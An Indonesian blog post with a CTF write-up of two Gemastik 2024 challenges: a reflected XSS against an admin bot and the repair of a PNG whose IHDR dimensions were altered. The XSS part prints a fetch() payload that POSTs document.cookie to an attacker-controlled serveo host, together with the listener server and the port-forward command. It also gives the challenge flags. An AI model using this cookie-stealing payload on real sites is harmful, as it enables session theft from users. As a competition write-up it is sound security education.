---
layout: "post"
title: "Writeup CTF Gemastik 2024 - Web & Forensics Writeup"
permalink: /blog/:title
toc: true
locale: id_ID
categories: blog
tags: ctf web-security xss forensics png gemastik
description: "Writeup CTF challenge Web Exploitation dan Forensics Gemastik Divisi Cybersecurity yang saya ikuti pada tahun 2024"
---

# Pendahuluan

Pada writeup kali ini, saya akan membahas dua challenge dari GEMASTIK CTF 2024 yang cukup menarik. Challenge pertama adalah **Baby XSS** yang merupakan challenge web exploitation, dan challenge kedua adalah **Baby Structured** yang merupakan challenge forensics terkait PNG file structure.

---

# Challenge 1: Baby XSS

## Deskripsi Challenge

> Aku yang baru belajar XSS menemukan sebuah repo untuk automasi XSS challenge deployment, berikut reponya: <br>https://github.com/dimasma0305/CTF-XSS-BOT/ <br>Bisakah kalian membantuku untuk melakukan exploitasi XSS sesuai pada repo kode vulnerable yang ada di repository tersebut?

**URL**: http://ctf.gemastik.id:9020/

**Kategori**: Web Exploitation

<img src="{{ '/assets/img/posts/2024-08-04-gemastik-2024/challxss.png' | prepend: site.baseurl }}" class="img-fluid center m-1">

## Analisis Awal

Sesuai dengan deskripsi challenge, ini merupakan challenge XSS (_Cross-Site Scripting_). Berdasarkan repository yang diberikan, vulnerability XSS terdapat pada halaman utama yaitu `http://ctf.gemastik.id:9020/` dengan parameter `x` pada URL.

<img src="{{ '/assets/img/posts/2024-08-04-gemastik-2024/index.png' | prepend: site.baseurl }}" class="img-fluid center m-1">

### Testing XSS Payload

Saya mencoba melakukan XSS sederhana dengan menambahkan parameter `?x=alert(1)` pada URL.

<img src="{{ '/assets/img/posts/2024-08-04-gemastik-2024/alert.png' | prepend: site.baseurl }}" class="img-fluid center m-1">

Ternyata payload XSS berhasil dieksekusi! Ini membuktikan bahwa aplikasi vulnerable terhadap XSS.

### Mencari Target: Admin Bot

Halaman bot admin berada pada `http://ctf.gemastik.id:9020/report`. Halaman ini memungkinkan kita untuk mengirimkan URL yang akan dikunjungi oleh bot admin.

<img src="{{ '/assets/img/posts/2024-08-04-gemastik-2024/adminbot.png' | prepend: site.baseurl }}" class="img-fluid center m-1">

Dari kode bot yang tersedia di repository, terlihat bahwa flag dimasukkan ke dalam cookie pada browser bot.

<img src="{{ '/assets/img/posts/2024-08-04-gemastik-2024/bot.png' | prepend: site.baseurl }}" class="img-fluid center m-1">

## Strategi Eksploitasi

Rencana eksploitasi adalah sebagai berikut:

1. Membuat HTTP Server sederhana untuk menerima request
2. Mengekspos server lokal ke internet menggunakan [serveo](https://serveo.net/)
3. Membuat payload XSS yang akan mencuri cookie bot
4. Mengirimkan payload melalui halaman report
5. Menangkap cookie yang berisi flag

### Membuat HTTP Server

Pertama, saya membuat file `server.py` untuk menangkap request yang masuk:

```python
#!/usr/bin/env python3
"""
License: MIT License
Copyright (c) 2023 Miel Donkers

Very simple HTTP server in python for logging requests
Usage::
    ./server.py [<port>]
"""
from http.server import BaseHTTPRequestHandler, HTTPServer
import logging
            
class S(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
        self._set_response()
        self.wfile.write("GET request for {}".format(self.path).encode('utf-8'))

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n",
                str(self.path), str(self.headers), post_data.decode('utf-8'))

        self._set_response()
        self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))

def run(server_class=HTTPServer, handler_class=S, port=8080):
    logging.basicConfig(level=logging.INFO)
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    logging.info('Starting httpd...\n')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping httpd...\n')

if __name__ == '__main__':
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()
```

### Menjalankan Server dan Port Forwarding

Jalankan HTTP Server pada port 8080 dan ekspos ke publik menggunakan serveo:

```bash
# Terminal 1: Jalankan HTTP Server
python server.py 8080

# Terminal 2: Port forwarding dengan serveo
ssh -R 80:localhost:8080 serveo.net
```

Serveo akan memberikan URL publik yang dapat diakses dari internet, misalnya `https://xxx.serveo.net`.

### Membuat Payload XSS

Payload XSS yang saya gunakan akan melakukan POST request ke HTTP Server dengan mengirimkan cookie sebagai body request. Berikut adalah payload yang digunakan:

```
http://proxy/?x=fetch(%27https://xxx.serveo.net%27,%20{method:%20%27POST%27,%20body:%20JSON.stringify(document.cookie)})
```

{% include alerts.html type="info" content="Ganti <code>xxx.serveo.net</code> dengan URL publik yang didapat dari port forwarding serveo." %}

Payload ini akan:
1. Mengambil semua cookie dari browser bot menggunakan `document.cookie`
2. Mengkonversi cookie menjadi JSON string
3. Mengirimkan cookie tersebut ke server kita melalui POST request

### Mengirim Payload ke Admin Bot

Masukkan URL berisi payload XSS ke dalam halaman admin bot (`/report`).

<img src="{{ '/assets/img/posts/2024-08-04-gemastik-2024/submit.png' | prepend: site.baseurl }}" class="img-fluid center m-1">

### Mendapatkan Flag

Setelah bot mengunjungi URL yang kita berikan, kita akan menerima POST request di HTTP Server yang berisi cookie dari bot.

<img src="{{ '/assets/img/posts/2024-08-04-gemastik-2024/xssflag.png' | prepend: site.baseurl }}" class="img-fluid center m-1">

Dan kita berhasil mendapatkan flag!

**Flag**: `gemastik{s3lamat_anda_m3ndap4tkan_XSS}`

---

# Challenge 2: Baby Structured

## Deskripsi Challenge

> my friend sent me a picture, but she say its got 'cropped'. can you recover it?

**Kategori**: Forensics

<img src="{{ '/assets/img/posts/2024-08-04-gemastik-2024/chall.png' | prepend: site.baseurl }}" class="img-fluid center m-1">

## Analisis File

Dari challenge ini kami diberikan sebuah file ZIP, dan ketika diekstrak terdapat sebuah gambar berformat PNG yang tidak dapat dibuka. Error ini disebabkan karena terdapat ketidakcocokan antara ukuran gambar (image size) dengan CRC checksum pada struktur PNG.

Untuk memverifikasi masalah pada file PNG, saya menggunakan tool `pngcheck`:

```bash
pngcheck file.png
```

<img src="{{ '/assets/img/posts/2024-08-04-gemastik-2024/pngcheck.png' | prepend: site.baseurl }}" class="img-fluid center m-1">

Terlihat bahwa terdapat error pada IHDR chunk yang menunjukkan bahwa CRC checksum tidak cocok dengan data yang ada.

## Memahami Struktur PNG

Untuk memperbaiki file PNG ini, kita perlu memahami struktur file PNG, khususnya bagian IHDR (_Image Header_).

### IHDR Chunk Structure

IHDR adalah chunk pertama dalam file PNG yang berisi informasi dasar tentang gambar. Struktur IHDR terdiri dari:

- **4 byte**: Width (lebar gambar)
- **4 byte**: Height (tinggi gambar)
- **1 byte**: Bit depth
- **1 byte**: Color type
- **1 byte**: Compression method
- **1 byte**: Filter method
- **1 byte**: Interlace method
- **4 byte**: CRC checksum

<img src="{{ '/assets/img/posts/2024-08-04-gemastik-2024/ihdr.jpg' | prepend: site.baseurl }}" class="img-fluid center m-1">

{% include alerts.html type="info" content="CRC (Cyclic Redundancy Check) adalah metode untuk mendeteksi kesalahan pada data. Setiap chunk dalam PNG memiliki CRC yang dihitung berdasarkan tipe chunk dan data di dalamnya." %}

## Strategi Pemecahan

Karena CRC checksum tidak cocok dengan data IHDR, kemungkinan besar nilai width atau height yang salah. Untuk menemukan nilai yang benar, kita perlu melakukan _brute force_ untuk mencoba berbagai kombinasi width dan height hingga menemukan nilai yang menghasilkan CRC checksum yang cocok.

### Menggunakan PNG Dimensions Bruteforcer

Saya menggunakan tool dari GitHub yang dapat melakukan brute force terhadap dimensi PNG: https://github.com/cjharris18/png-dimensions-bruteforcer

Tool ini akan mencoba berbagai kombinasi width dan height dan mencocokkannya dengan CRC checksum yang ada di file. Ketika menemukan kombinasi yang tepat, tool akan berhenti dan menampilkan hasilnya.

```bash
./png_image_bruteforce.py -f file.png
```

<img src="{{ '/assets/img/posts/2024-08-04-gemastik-2024/bruteforcer.png' | prepend: site.baseurl }}" class="img-fluid center m-1">

### Mendapatkan Flag

Setelah proses brute force selesai, tool berhasil menemukan dimensi yang tepat dan menghasilkan file PNG yang dapat dibuka. Berikut adalah gambar yang berhasil diperbaiki:

<img src="{{ '/assets/img/posts/2024-08-04-gemastik-2024/flag.png' | prepend: site.baseurl }}" class="img-fluid center m-1">

**Flag**: `gemastik{g0t_cr0pped_by_structur3}`

---

# Kesimpulan

Dalam writeup ini, kita telah membahas dua challenge yang berbeda dari GEMASTIK CTF 2024:

## Baby XSS
Challenge ini memberikan konsep:
- **XSS (Cross-Site Scripting)**: Vulnerability yang memungkinkan attacker menjalankan JavaScript pada browser korban
- **Cookie Stealing**: Teknik mencuri cookie menggunakan XSS untuk mendapatkan data sensitif
- **Admin Bot**: Simulasi user yang akan mengunjungi URL berbahaya
- **Out-of-Band Data Exfiltration**: Mengirimkan data yang dicuri ke server attacker

Langkah preventif untuk menghindari XSS:
1. Selalu lakukan input validation dan sanitization
2. Gunakan Content Security Policy (CSP)
3. Encode output sebelum ditampilkan ke user
4. Gunakan HTTP-only flag pada cookie sensitif
5. Implementasi X-XSS-Protection header

## Baby Structured
Challenge ini memberikan konsep:
- **PNG File Structure**: Memahami struktur internal file PNG, terutama chunk IHDR
- **CRC Checksum**: Mekanisme verifikasi integritas data dalam file PNG
- **File Forensics**: Teknik memperbaiki file yang corrupt atau rusak
- **Brute Force**: Metode untuk menemukan nilai yang tepat dengan mencoba berbagai kemungkinan

Pembelajaran dari forensics:
1. Memahami struktur file format sangat penting dalam digital forensics
2. Tool automation sangat membantu dalam proses brute force
3. CRC checksum dapat digunakan untuk memverifikasi integritas data
4. File yang tampak rusak masih bisa diperbaiki dengan pemahaman yang tepat tentang formatnya